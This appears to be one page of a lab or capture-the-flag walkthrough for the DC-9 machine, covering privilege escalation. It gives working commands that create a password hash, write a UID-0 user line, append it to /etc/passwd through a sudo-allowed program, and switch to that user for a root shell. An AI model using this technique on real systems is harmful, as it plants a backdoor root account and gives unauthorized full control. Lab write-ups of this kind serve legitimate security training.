<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>6. Privilege Escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>6. Privilege Escalation</u></b></h1><br />Create a new user with root access and make the entry of the user inside the “/etc/passwd” file using the “test” file.<br /><br />a) On your Kali Machine create a user and its password hash. <br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$openssl</span>&nbsp;<span style="color:#ff9d00;font-weight:700">passwd</span>&nbsp;-1&nbsp;-salt&nbsp;pavan&nbsp;123456<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">$1$pavan$qv9M3fBmtDPrOTBZflNl81</span><br /><br />b) From your victime machine copy the new user line to “/tmp/real”.<br /><br />Add username, colons (:), and “:0:0::” to make the entry that could act as a “root” user. <br /><br />“newuser:gS5P271ttZ6wBiU2NflYH/:0:0:newuser:/root:/bin/bash”<br /><br /><div class="codebox"><div class="codebox">fredf@dc-9<span style="color:#ff9d00;font-weight:700">:/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>devstuff<span style="color:#ff9d00;font-weight:700">/</span>dist<span style="color:#ff9d00;font-weight:700">/</span>test$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">'pavan:$1$pavan$qv9M3fBmtDPrOTBZflNl81:0:0::/root:/bin/bash'</span>&nbsp;&gt;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>real<br /></div></div><br /><br />c) Use the “test” program that we found  earlier with the “real” file and appended that user hash that we just  created inside the “/etc/passwd” file.<br /><br /><div class="codebox"><div class="codebox">fredf@dc-9<span style="color:#ff9d00;font-weight:700">:/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>devstuff<span style="color:#ff9d00;font-weight:700">/</span>dist<span style="color:#ff9d00;font-weight:700">/</span>test$&nbsp;<span style="color:#ff9d00;font-weight:700">sudo</span>&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>test&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>real&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span><br /></div></div><br /><br />d) Swith user to “pavan".<br /><br /><div class="codebox"><div class="codebox">fredf@dc-9<span style="color:#ff9d00;font-weight:700">:/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>devstuff<span style="color:#ff9d00;font-weight:700">/</span>dist<span style="color:#ff9d00;font-weight:700">/</span>test$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;pavan<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">root@dc-9:/opt/devstuff/dist/test#</span><br /><br />You're “root”.<br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>